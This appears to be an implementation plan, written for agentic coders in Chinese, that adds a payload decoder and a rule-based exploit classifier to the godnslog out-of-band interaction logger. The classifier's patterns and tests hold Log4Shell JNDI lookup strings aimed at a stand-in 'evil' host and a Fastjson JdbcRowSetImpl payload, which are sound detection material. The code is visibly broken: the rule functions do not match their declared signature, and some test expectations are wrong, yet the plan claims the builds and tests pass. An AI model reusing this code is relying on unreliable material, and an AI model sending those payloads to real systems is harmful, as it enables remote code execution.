# Spec A: 数据增强层 — 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现解码引擎（base32/hex/base64 自动检测还原）和利用类型分类器（基于规则的特征匹配），集成到 Interaction 写入链路中。

**Architecture:** 解码引擎是纯函数包，4 文件（入口 + 3 编码器）；分类器也是纯函数包，3 文件（入口 + 规则 + 模式常量）。两者在 `internal/interaction/service.go` 的 `CreateInteraction()` 中串联调用。数据模型扩展在 `internal/models/interaction.go` 中新增 4 个富化字段。

**Tech Stack:** Go 标准库 `encoding/base64`, `encoding/hex`, `encoding/base32`, `regexp`

---

### Task 1: 解码引擎 — base64 解码器

**Files:**
- Create: `internal/interaction/decoder/base64.go`
- Test: `internal/interaction/decoder/decoder_test.go`（与入口共用）

- [ ] **Step 1: 创建 `internal/interaction/decoder/base64.go`**

```go
package decoder

import (
	"encoding/base64"
	"strings"
)

// base64Detect checks if input looks like base64 (standard or URL-safe)
func base64Detect(input string) bool {
	if len(input) < 4 {
		return false
	}
	// Standard base64: [A-Za-z0-9+/=]
	// URL-safe base64: [A-Za-z0-9\-_=]
	for _, c := range input {
		if !((c >= 'A' && c <= 'Z') ||
			(c >= 'a' && c <= 'z') ||
			(c >= '0' && c <= '9') ||
			c == '+' || c == '/' ||
			c == '-' || c == '_' ||
			c == '=') {
			return false
		}
	}
	return true
}

// decodeBase64 tries both standard and URL-safe base64 decoding
func decodeBase64(input string) (string, bool) {
	// Try standard base64 first
	decoded, err := base64.StdEncoding.DecodeString(input)
	if err == nil {
		return string(decoded), true
	}
	// Try URL-safe base64
	decoded, err = base64.URLEncoding.DecodeString(input)
	if err == nil {
		return string(decoded), true
	}
	// Try with padding fix (auto-add = padding)
	missing := len(input) % 4
	if missing > 0 {
		padded := input + strings.Repeat("=", 4-missing)
		decoded, err = base64.StdEncoding.DecodeString(padded)
		if err == nil {
			return string(decoded), true
		}
		decoded, err = base64.URLEncoding.DecodeString(padded)
		if err == nil {
			return string(decoded), true
		}
	}
	return "", false
}
```

- [ ] **Step 2: 运行编译检查**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go vet ./internal/interaction/decoder/`
Expected: 编译通过（可能因 decoder.go 未创建而报错，先忽略，所有文件建完再统一验证）

---

### Task 2: 解码引擎 — hex 解码器

**Files:**
- Create: `internal/interaction/decoder/hex.go`

- [ ] **Step 1: 创建 `internal/interaction/decoder/hex.go`**

```go
package decoder

import (
	"encoding/hex"
	"unicode"
)

// hexDetect checks if input is valid hex string
func hexDetect(input string) bool {
	if len(input) < 2 || len(input)%2 != 0 {
		return false
	}
	for _, c := range input {
		if !((c >= '0' && c <= '9') ||
			(c >= 'a' && c <= 'f') ||
			(c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// decodeHex decodes a hex string
func decodeHex(input string) (string, bool) {
	decoded, err := hex.DecodeString(input)
	if err != nil {
		return "", false
	}
	// Only return if the result is readable text
	if isReadableText(decoded) {
		return string(decoded), true
	}
	return "", false
}

// isReadableText checks if bytes are printable ASCII or UTF-8
func isReadableText(data []byte) bool {
	if len(data) == 0 {
		return false
	}
	for _, b := range data {
		if b == 0 || b == 0xFF {
			return false
		}
		// Allow control chars only tab, newline, carriage return
		if b < 0x20 && b != 0x09 && b != 0x0A && b != 0x0D {
			return false
		}
	}
	return true
}
```

---

### Task 3: 解码引擎 — base32 解码器

**Files:**
- Create: `internal/interaction/decoder/base32.go`

- [ ] **Step 1: 创建 `internal/interaction/decoder/base32.go`**

```go
package decoder

import (
	"encoding/base32"
	"strings"
)

// base32Detect checks if input looks like base32 (RFC 4648)
func base32Detect(input string) bool {
	if len(input) < 4 || len(input)%8 != 0 {
		return false
	}
	for _, c := range input {
		if !((c >= 'A' && c <= 'Z') ||
			(c >= '2' && c <= '7') ||
			c == '=') {
			return false
		}
	}
	return true
}

// decodeBase32 decodes a base32 string
func decodeBase32(input string) (string, bool) {
	// Add padding if needed
	missing := len(input) % 8
	if missing > 0 {
		input = input + strings.Repeat("=", 8-missing)
	}
	decoded, err := base32.StdEncoding.DecodeString(strings.ToUpper(input))
	if err != nil {
		return "", false
	}
	if isReadableText(decoded) {
		return string(decoded), true
	}
	return "", false
}
```

---

### Task 4: 解码引擎 — 入口与测试

**Files:**
- Create: `internal/interaction/decoder/decoder.go`
- Create: `internal/interaction/decoder/decoder_test.go`

- [ ] **Step 1: 创建 `internal/interaction/decoder/decoder.go`**

```go
package decoder

import (
	"net/url"
	"regexp"
	"strings"
)

// Result 表示一次解码的结果
type Result struct {
	Original  string `json:"original"`
	Decoded   string `json:"decoded"`
	Encoding  string `json:"encoding"` // "base64", "base32", "hex", ""
	Confident bool   `json:"confident"`
}

// Decode 自动检测并解码，返回第一个高置信度结果
func Decode(input string) Result {
	if input == "" {
		return Result{Original: input, Encoding: "", Confident: false}
	}

	// Try to extract encoded segment from mixed content
	candidates := extractCandidates(input)
	for _, c := range candidates {
		if r := tryDecoders(c); r.Confident {
			return r
		}
	}

	return Result{Original: input, Encoding: "", Confident: false}
}

// DecodeAll 尝试所有编码并返回全部可能结果
func DecodeAll(input string) []Result {
	if input == "" {
		return nil
	}

	var results []Result
	candidates := extractCandidates(input)

	// Track seen encodings to avoid duplicates
	seen := make(map[string]bool)

	for _, c := range candidates {
		// Try base64
		if !seen["base64"] && base64Detect(c) {
			if decoded, ok := decodeBase64(c); ok {
				results = append(results, Result{
					Original: c, Decoded: decoded, Encoding: "base64", Confident: true,
				})
				seen["base64"] = true
			}
		}
		// Try base32
		if !seen["base32"] && base32Detect(c) {
			if decoded, ok := decodeBase32(c); ok {
				results = append(results, Result{
					Original: c, Decoded: decoded, Encoding: "base32", Confident: true,
				})
				seen["base32"] = true
			}
		}
		// Try hex
		if !seen["hex"] && hexDetect(c) {
			if decoded, ok := decodeHex(c); ok {
				results = append(results, Result{
					Original: c, Decoded: decoded, Encoding: "hex", Confident: true,
				})
				seen["hex"] = true
			}
		}
	}

	return results
}

// tryDecoders tries all decoders in priority order, return first confident result
func tryDecoders(input string) Result {
	// Priority: base64 > base32 > hex (by frequency)
	if base64Detect(input) {
		if decoded, ok := decodeBase64(input); ok {
			return Result{Original: input, Decoded: decoded, Encoding: "base64", Confident: true}
		}
	}
	if base32Detect(input) {
		if decoded, ok := decodeBase32(input); ok {
			return Result{Original: input, Decoded: decoded, Encoding: "base32", Confident: true}
		}
	}
	if hexDetect(input) {
		if decoded, ok := decodeHex(input); ok {
			return Result{Original: input, Decoded: decoded, Encoding: "hex", Confident: true}
		}
	}
	return Result{Original: input, Encoding: "", Confident: false}
}

// extractCandidates extracts and normalizes potential encoded segments
func extractCandidates(input string) []string {
	var candidates []string

	// First try URL decoding
	if decoded, err := url.QueryUnescape(input); err == nil && decoded != input {
		candidates = append(candidates, strings.TrimSpace(decoded))
	}

	// Try to find base64-like segments in mixed content
	re := regexp.MustCompile(`[A-Za-z0-9+/=_-]{8,}`)
	matches := re.FindAllString(input, -1)
	for _, m := range matches {
		candidates = append(candidates, strings.TrimSpace(m))
	}

	// Add the original input as last resort
	candidates = append(candidates, strings.TrimSpace(input))

	return candidates
}
```

- [ ] **Step 2: 创建 decoder 测试**

```go
package decoder

import (
	"testing"
)

func TestDecodeBase64(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		wantOk   bool
		wantDec  string
	}{
		{"standard", "eyJhZG1pbiI6InRydWUifQ==", true, `{"admin":"true"}`},
		{"nopadding", "aGVsbG8", true, "hello"},
		{"urlsafe", "dGVzdGluZy11cmxzYWZl", true, "testing-urlsafe"},
		{"invalid", "!!!not-base64!!!", false, ""},
		{"empty", "", false, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := decodeBase64(tt.input)
			if ok != tt.wantOk {
				t.Errorf("decodeBase64() ok = %v, want %v", ok, tt.wantOk)
				return
			}
			if got != tt.wantDec {
				t.Errorf("decodeBase64() = %q, want %q", got, tt.wantDec)
			}
		})
	}
}

func TestDecodeHex(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantOk  bool
		wantDec string
	}{
		{"simple", "68656c6c6f", true, "hello"},
		{"uppercase", "48454C4C4F", true, "HELLO"},
		{"short", "a", false, ""},      // odd length
		{"binary", "deadbeef", false, ""}, // non-readable output
		{"empty", "", false, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := decodeHex(tt.input)
			if ok != tt.wantOk {
				t.Errorf("decodeHex() ok = %v, want %v", ok, tt.wantOk)
				return
			}
			if got != tt.wantDec {
				t.Errorf("decodeHex() = %q, want %q", got, tt.wantDec)
			}
		})
	}
}

func TestDecodeBase32(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantOk  bool
		wantDec string
	}{
		{"simple", "NBSWY3DP", true, "hello"},
		{"padding", "NBSWY3DPEBZXI5DJ", true, "helloworld"},
		{"invalid", "11111111", false, ""},
		{"empty", "", false, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := decodeBase32(tt.input)
			if ok != tt.wantOk {
				t.Errorf("decodeBase32() ok = %v, want %v", ok, tt.wantOk)
				return
			}
			if got != tt.wantDec {
				t.Errorf("decodeBase32() = %q, want %q", got, tt.wantDec)
			}
		})
	}
}

func TestDecode(t *testing.T) {
	tests := []struct {
		name           string
		input          string
		wantEncoding string
		wantConfident bool
		wantDec     string
	}{
		{"base64", "aGVsbG8=", "base64", true, "hello"},
		{"hex", "68656c6c6f", "hex", true, "hello"},
		{"base32", "NBSWY3DP", "base32", true, "hello"},
		{"plaintext", "hello", "", false, ""},
		{"empty", "", "", false, ""},
		{"urlencoded", "aGVsbG8%3D", "base64", true, "hello="},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Decode(tt.input)
			if got.Encoding != tt.wantEncoding {
				t.Errorf("Decode() encoding = %q, want %q", got.Encoding, tt.wantEncoding)
			}
			if got.Confident != tt.wantConfident {
				t.Errorf("Decode() confident = %v, want %v", got.Confident, tt.wantConfident)
			}
			if tt.wantConfident && got.Decoded != tt.wantDec {
				t.Errorf("Decode() decoded = %q, want %q", got.Decoded, tt.wantDec)
			}
		})
	}
}

func TestDecodeAll(t *testing.T) {
	input := "68656c6c6f"
	results := DecodeAll(input)
	if len(results) == 0 {
		t.Fatal("DecodeAll() returned no results")
	}
	foundHex := false
	for _, r := range results {
		if r.Encoding == "hex" {
			foundHex = true
			if r.Decoded != "hello" {
				t.Errorf("expected hex decode 'hello', got %q", r.Decoded)
			}
		}
	}
	if !foundHex {
		t.Error("DecodeAll() should include hex result")
	}
}

func TestExtractCandidates(t *testing.T) {
	candidates := extractCandidates("data:eyJhIjoxfQ==")
	if len(candidates) == 0 {
		t.Fatal("extractCandidates() returned no candidates")
	}
}
```

- [ ] **Step 3: 运行测试**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go test ./internal/interaction/decoder/ -v`
Expected: All tests PASS

- [ ] **Step 4: Commit**

```bash
git add internal/interaction/decoder/
git commit -m "feat: add data decoder engine (base64/base32/hex auto-detect and decode)

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 5: 分类器 — 规则与模式定义

**Files:**
- Create: `internal/interaction/classifier/patterns.go`
- Create: `internal/interaction/classifier/rules.go`

- [ ] **Step 1: 创建 `internal/interaction/classifier/patterns.go`**

```go
package classifier

// Exploit type constants
const (
	ExploitLog4shell      = "log4shell"
	ExploitFastjson       = "fastjson"
	ExploitXXE            = "xxe"
	ExploitSSRF           = "ssrf"
	ExploitSQLi           = "sqli"
	ExploitRCE            = "rce"
	ExploitDeserialization = "deserialization"
	ExploitLDAP           = "ldap"
	ExploitXSS            = "xss"
)

// Confidence levels
const (
	ConfidenceHigh   = "high"
	ConfidenceMedium = "medium"
	ConfidenceLow    = "low"
)

// Pattern constants for matching
const (
	// Log4Shell patterns
	JNDIPattern = "${jndi:"

	// Fastjson patterns
	FastjsonTypePattern = `{"@type":"`

	// Path patterns
	PathXXE  = "/xxe"
	PathXML  = "/xml"
	PathCmd  = "/cmd"
	PathExec = "/exec"

	// DNS domain patterns
	DNSSQLPattern    = "sql"
	DNSCMDPattern    = "cmd"
	DNSExecPattern   = "exec"
	DNSJNDIPattern   = "jndi"
	DNSLDAPPattern   = "ldap"
	DNSXXEPattern    = "xxe"
	DNSRFIPattern    = "rfi"
	DNSDeserPattern  = "object"

	// HTTP body patterns
	BodyCmdPattern  = "whoami"
	BodyExecPattern = "exec"
)
```

- [ ] **Step 2: 创建 `internal/interaction/classifier/rules.go`**

```go
package classifier

import (
	"strings"

	"github.com/chennqqi/godnslog/internal/models"
)

// Rule 定义一条分类规则
type Rule struct {
	ID          string
	Name        string
	ExploitType string
	Confidence  string
	Priority    int // 越小越优先
	MatchFunc   func(*models.Interaction) (bool, string)
}

// Classification 分类结果
type Classification struct {
	ExploitType string `json:"exploit_type"`
	Confidence  string `json:"confidence"`
	RuleID      string `json:"rule_id"`
	Evidence    string `json:"evidence"`
}

// defaultRules 返回默认规则列表（按优先级排序）
func defaultRules() []Rule {
	return []Rule{
		// === HIGH confidence rules ===
		{
			ID: "log4shell-jndi-dns", Name: "Log4Shell JNDI DNS",
			ExploitType: ExploitLog4shell, Confidence: ConfidenceHigh, Priority: 10,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Domain == nil || *i.Domain == "" {
					return false
				}
				return strings.Contains(strings.ToLower(*i.Domain), "${jndi:") ||
					strings.Contains(strings.ToLower(*i.Domain), "jndi:ldap") ||
					strings.Contains(strings.ToLower(*i.Domain), "jndi:rmi")
			},
		},
		{
			ID: "log4shell-jndi-http", Name: "Log4Shell JNDI HTTP",
			ExploitType: ExploitLog4shell, Confidence: ConfidenceHigh, Priority: 11,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Body != nil && strings.Contains(*i.Body, "${jndi:") {
					return true
				}
				if i.Headers != nil {
					for k, v := range i.Headers {
						if strings.Contains(k, "${jndi:") || strings.Contains(v, "${jndi:") {
							return true
						}
					}
				}
				return false
			},
		},
		{
			ID: "fastjson-body", Name: "Fastjson Type",
			ExploitType: ExploitFastjson, Confidence: ConfidenceHigh, Priority: 12,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Body == nil || *i.Body == "" {
					return false
				}
				return strings.Contains(*i.Body, `{"@type":"`) ||
					strings.Contains(*i.Body, `{"@type":'`)
			},
		},
		{
			ID: "xxe-path", Name: "XXE Path",
			ExploitType: ExploitXXE, Confidence: ConfidenceHigh, Priority: 13,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Path == nil || *i.Path == "" {
					return false
				}
				path := strings.ToLower(*i.Path)
				return path == "/xxe" || strings.HasPrefix(path, "/xxe/") ||
					path == "/xml" || strings.HasPrefix(path, "/xml/")
			},
		},
		{
			ID: "rce-path", Name: "RCE Path",
			ExploitType: ExploitRCE, Confidence: ConfidenceHigh, Priority: 14,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Path == nil || *i.Path == "" {
					return false
				}
				path := strings.ToLower(*i.Path)
				return path == "/cmd" || strings.HasPrefix(path, "/cmd/") ||
					path == "/exec" || strings.HasPrefix(path, "/exec/")
			},
		},
		{
			ID: "deserialization-java", Name: "Java Deserialization",
			ExploitType: ExploitDeserialization, Confidence: ConfidenceHigh, Priority: 15,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Body == nil || *i.Body == "" {
					return false
				}
				body := *i.Body
				return strings.Contains(body, "aced0005") ||
					strings.Contains(body, "rO0AB") // base64 Java serialization
			},
		},
		// === MEDIUM confidence rules ===
		{
			ID: "ssrf-path", Name: "SSRF Path",
			ExploitType: ExploitSSRF, Confidence: ConfidenceMedium, Priority: 20,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Path == nil || *i.Path == "" {
					return false
				}
				path := strings.ToLower(*i.Path)
				return strings.Contains(path, "/redirect") ||
					strings.Contains(path, "/proxy") ||
					strings.Contains(path, "/fetch") ||
					strings.Contains(path, "/curl") ||
					strings.Contains(path, "/get")
			},
		},
		{
			ID: "sqli-path", Name: "SQLi Path",
			ExploitType: ExploitSQLi, Confidence: ConfidenceMedium, Priority: 21,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Path == nil || *i.Path == "" {
					return false
				}
				path := strings.ToLower(*i.Path)
				return strings.Contains(path, "sql") ||
					strings.Contains(path, "?id=") ||
					strings.Contains(path, "?page=") ||
					strings.Contains(path, "?query=")
			},
		},
		{
			ID: "dns-rce-domain", Name: "DNS RCE Keywords",
			ExploitType: ExploitRCE, Confidence: ConfidenceMedium, Priority: 22,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Domain == nil || *i.Domain == "" {
					return false
				}
				domain := strings.ToLower(*i.Domain)
				return strings.Contains(domain, "rce") ||
					strings.Contains(domain, "cmd") ||
					strings.Contains(domain, "exec") ||
					strings.Contains(domain, "whoami")
			},
		},
		{
			ID: "dns-sqli-domain", Name: "DNS SQLi Keywords",
			ExploitType: ExploitSQLi, Confidence: ConfidenceMedium, Priority: 23,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Domain == nil || *i.Domain == "" {
					return false
				}
				domain := strings.ToLower(*i.Domain)
				return strings.Contains(domain, "sql") ||
					strings.Contains(domain, "sqli") ||
					strings.Contains(domain, "dbname") ||
					strings.Contains(domain, "table")
			},
		},
		{
			ID: "dns-xxe-domain", Name: "DNS XXE Keywords",
			ExploitType: ExploitXXE, Confidence: ConfidenceMedium, Priority: 24,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Domain == nil || *i.Domain == "" {
					return false
				}
				domain := strings.ToLower(*i.Domain)
				return strings.Contains(domain, "xxe") ||
					strings.Contains(domain, "dtd") ||
					strings.Contains(domain, "entity")
			},
		},
		// === LOW confidence rules ===
		{
			ID: "dns-ldap-domain", Name: "DNS LDAP Keywords",
			ExploitType: ExploitLDAP, Confidence: ConfidenceLow, Priority: 30,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Domain == nil || *i.Domain == "" {
					return false
				}
				return strings.Contains(strings.ToLower(*i.Domain), "ldap")
			},
		},
		{
			ID: "path-xss", Name: "XSS Path",
			ExploitType: ExploitXSS, Confidence: ConfidenceLow, Priority: 31,
			MatchFunc: func(i *models.Interaction) bool {
				if i.Path == nil || *i.Path == "" {
					return false
				}
				return strings.Contains(strings.ToLower(*i.Path), "/xss") ||
					strings.Contains(strings.ToLower(*i.Path), "/callback")
			},
		},
	}
}
```

- [ ] **Step 2: Commit**

```bash
git add internal/interaction/classifier/patterns.go internal/interaction/classifier/rules.go
git commit -m "feat: add exploit classifier rules and pattern definitions

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 6: 分类器 — 入口与测试

**Files:**
- Create: `internal/interaction/classifier/classifier.go`
- Create: `internal/interaction/classifier/classifier_test.go`

- [ ] **Step 1: 创建 `internal/interaction/classifier/classifier.go`**

```go
package classifier

import (
	"sort"

	"github.com/chennqqi/godnslog/internal/models"
)

// classify 执行分类匹配，返回第一个高置信度匹配，否则降级匹配
func Classify(interaction *models.Interaction) *Classification {
	rules := defaultRules()
	// Sort by priority
	sort.Slice(rules, func(i, j int) bool {
		return rules[i].Priority < rules[j].Priority
	})

	var bestMatch *Classification

	for _, rule := range rules {
		matched, evidence := rule.MatchFunc(interaction)
		if !matched {
			continue
		}

		cls := &Classification{
			ExploitType: rule.ExploitType,
			Confidence:  rule.Confidence,
			RuleID:      rule.ID,
			Evidence:    evidence,
		}

		// High confidence: return immediately
		if rule.Confidence == ConfidenceHigh {
			return cls
		}

		// Medium/low: keep the best match
		if bestMatch == nil || rule.Priority < bestMatchRule(bestMatch, rules) {
			bestMatch = cls
		}
	}

	return bestMatch
}

// ClassifyAll 返回所有匹配的分类（从高到低排序）
func ClassifyAll(interaction *models.Interaction) []*Classification {
	rules := defaultRules()
	sort.Slice(rules, func(i, j int) bool {
		return rules[i].Priority < rules[j].Priority
	})

	var results []*Classification
	for _, rule := range rules {
		matched, evidence := rule.MatchFunc(interaction)
		if matched {
			results = append(results, &Classification{
				ExploitType: rule.ExploitType,
				Confidence:  rule.Confidence,
				RuleID:      rule.ID,
				Evidence:    evidence,
			})
		}
	}
	return results
}

// bestMatchRule finds the priority of the best match
func bestMatchRule(cls *Classification, rules []Rule) int {
	for _, r := range rules {
		if r.ID == cls.RuleID {
			return r.Priority
		}
	}
	return 999
}
```

- [ ] **Step 2: 创建 `internal/interaction/classifier/classifier_test.go`**

```go
package classifier

import (
	"testing"

	"github.com/chennqqi/godnslog/internal/models"
)

func TestClassifyLog4ShellDNS(t *testing.T) {
	token := "test123"
	i := &models.Interaction{
		Type:   "dns",
		Domain: &token,
		Token:  &token,
	}
	// Set Domain to jndi pattern
	jndiDomain := "${jndi:ldap://evil.test123.dnslog.fun}"
	i.Domain = &jndiDomain

	cls := Classify(i)
	if cls == nil {
		t.Fatal("Classify() returned nil, expected log4shell")
	}
	if cls.ExploitType != ExploitLog4shell {
		t.Errorf("expected exploit_type %q, got %q", ExploitLog4shell, cls.ExploitType)
	}
	if cls.Confidence != ConfidenceHigh {
		t.Errorf("expected confidence 'high', got %q", cls.Confidence)
	}
}

func TestClassifyXXE(t *testing.T) {
	token := "test123"
	path := "/xxe"
	i := &models.Interaction{
		Type:  "http",
		Path:  &path,
		Token: &token,
	}

	cls := Classify(i)
	if cls == nil {
		t.Fatal("Classify() returned nil, expected xxe")
	}
	if cls.ExploitType != ExploitXXE {
		t.Errorf("expected exploit_type %q, got %q", ExploitXXE, cls.ExploitType)
	}
}

func TestClassifyFastjson(t *testing.T) {
	body := `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://test"}`
	token := "test123"
	i := &models.Interaction{
		Type:  "http",
		Body:  &body,
		Token: &token,
	}

	cls := Classify(i)
	if cls == nil {
		t.Fatal("Classify() returned nil, expected fastjson")
	}
	if cls.ExploitType != ExploitFastjson {
		t.Errorf("expected exploit_type %q, got %q", ExploitFastjson, cls.ExploitType)
	}
}

func TestClassifyNoMatch(t *testing.T) {
	token := "test123"
	domain := "www.google.com"
	i := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
		Token:  &token,
	}

	cls := Classify(i)
	if cls != nil {
		t.Errorf("expected nil classification for non-exploit input, got %+v", cls)
	}
}

func TestClassifyAll(t *testing.T) {
	path := "/xxe"
	domain := "xxe.test.example.com"
	token := "test123"
	i := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
		Path:   &path,
		Token:  &token,
	}

	results := ClassifyAll(i)
	if len(results) == 0 {
		t.Fatal("ClassifyAll() returned no results")
	}
	// Should contain at least XXE from path and XXE from domain
	foundXXE := false
	for _, r := range results {
		if r.ExploitType == ExploitXXE {
			foundXXE = true
			break
		}
	}
	if !foundXXE {
		t.Error("ClassifyAll() should include XXE classification")
	}
	// Results should be ordered by priority
	for i := 1; i < len(results); i++ {
		if results[i-1].Confidence == ConfidenceHigh && results[i].Confidence != ConfidenceHigh {
			// High confidence should come before lower confidence: OK
		}
	}
}

func TestClassifySqlInject(t *testing.T) {
	path := "/search?query=test"
	token := "test123"
	i := &models.Interaction{
		Type:  "http",
		Path:  &path,
		Token: &token,
	}

	cls := Classify(i)
	if cls == nil {
		t.Fatal("Classify() returned nil for SQLi path pattern")
	}
	if cls.ExploitType != ExploitSQLi {
		t.Errorf("expected exploit_type %q, got %q", ExploitSQLi, cls.ExploitType)
	}
}

func TestClassifyEmptyInteraction(t *testing.T) {
	i := &models.Interaction{}
	cls := Classify(i)
	if cls != nil {
		t.Errorf("expected nil for empty interaction, got %+v", cls)
	}
}
```

- [ ] **Step 3: 运行分类器测试**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go test ./internal/interaction/classifier/ -v`
Expected: All tests PASS

- [ ] **Step 4: Commit**

```bash
git add internal/interaction/classifier/
git commit -m "feat: add exploit classifier engine with rule-based matching

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 7: 扩展 Interaction 数据模型

**Files:**
- Modify: `internal/models/interaction.go` — 新增 4 个字段

- [ ] **Step 1: 向 `internal/models/interaction.go` 的 Interaction 结构体末尾（`CreatedAt` 字段后）添加富化字段**

在 `CreatedAt` 字段定义之后添加：

```go
		// Enrichment fields (set by data enhancement pipeline)
		DecodedData *string `json:"decoded_data,omitempty" xorm:"'decoded_data' mediumtext"`
		Encoding    *string `json:"encoding,omitempty" xorm:"'encoding' varchar(32)"`
		ExploitType *string `json:"exploit_type,omitempty" xorm:"'exploit_type' varchar(64) index"`
		Confidence  *string `json:"confidence,omitempty" xorm:"'confidence' varchar(16)"`
```

并在 `MarshalJSON` 中不做特殊处理（由 omitempty 控制）。

- [ ] **Step 2: 验证编译**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go build ./internal/models/`
Expected: 编译通过

- [ ] **Step 3: Commit**

```bash
git add internal/models/interaction.go
git commit -m "feat: add enrichment fields (decoded_data, encoding, exploit_type, confidence) to Interaction model

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 8: 更新 Migration

**Files:**
- Modify: `internal/interaction/migration.go`

- [ ] **Step 1: 更新 migration 以同步 models.Interaction 而非本地 Interaction**

将 `internal/interaction/migration.go` 内容改为：

```go
package interaction

import (
	"xorm.io/xorm"

	"github.com/chennqqi/godnslog/internal/models"
)

// MigrateInteraction runs database migration for interaction tables
func MigrateInteraction(engine *xorm.Engine) error {
	return engine.Sync(new(models.Interaction))
}
```

- [ ] **Step 2: 验证编译**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go build ./internal/interaction/`
Expected: 编译通过

- [ ] **Step 3: Commit**

```bash
git add internal/interaction/migration.go
git commit -m "fix: sync canonical models.Interaction in migration to include enrichment fields

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 9: 集成解码和分类到 CreateInteraction

**Files:**
- Modify: `internal/interaction/service.go`

- [ ] **Step 1: 在 `CreateInteraction` 方法中集成解码和分类**

在 `internal/interaction/service.go` 的 import 块中添加：

```go
	"github.com/chennqqi/godnslog/internal/interaction/classifier"
	"github.com/chennqqi/godnslog/internal/interaction/decoder"
```

在 `CreateInteraction` 方法中的自动归因代码之后、`InsertOne` 之前添加：

```go
	// Data enhancement pipeline: decode + classify
	enhanceInteraction(interaction)
```

添加新的私有方法：

```go
// enhanceInteraction runs the data enhancement pipeline (decode + classify) on an interaction.
// This is a no-error enrichment — failures should not block interaction creation.
func enhanceInteraction(interaction *models.Interaction) {
	if interaction == nil {
		return
	}

	// Step 1: Try to decode exfiltrated data
	var decodeInput string
	switch interaction.Type {
	case "dns":
		if interaction.Domain != nil && *interaction.Domain != "" {
			decodeInput = *interaction.Domain
		}
	case "http":
		if interaction.Body != nil && *interaction.Body != "" {
			decodeInput = *interaction.Body
		} else if interaction.Path != nil && *interaction.Path != "" {
			decodeInput = *interaction.Path
		}
	default:
		if interaction.Body != nil && *interaction.Body != "" {
			decodeInput = *interaction.Body
		} else if interaction.RawData != "" {
			decodeInput = interaction.RawData
		}
	}

	if decodeInput != "" {
		result := decoder.Decode(decodeInput)
		if result.Confident {
			interaction.DecodedData = &result.Decoded
			interaction.Encoding = &result.Encoding
		}
	}

	// Step 2: Classify the interaction
	cls := classifier.Classify(interaction)
	if cls != nil {
		interaction.ExploitType = &cls.ExploitType
		interaction.Confidence = &cls.Confidence
	}
}
```

- [ ] **Step 2: 验证编译**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go build ./internal/interaction/`
Expected: 编译通过

- [ ] **Step 3: 运行所有相关测试**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go test ./internal/interaction/... -v`
Expected: All PASS

- [ ] **Step 4: Commit**

```bash
git add internal/interaction/service.go
git commit -m "feat: integrate decoder and classifier into CreateInteraction pipeline

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```

---

### Task 10: 全量编译验证

- [ ] **Step 1: 全量编译**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go build ./...`
Expected: 编译成功，无错误

- [ ] **Step 2: 运行全量测试**

Run: `cd /data/dev/github.com/chennqqi/godnslog && go test ./... 2>&1 | tail -20`
Expected: 无 FAIL，或仅与数据库相关的集成测试跳过

- [ ] **Step 3: 最终提交**

```bash
git add .
git commit -m "chore: verify Spec A data enhancement layer compiles and passes tests

Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>"
```
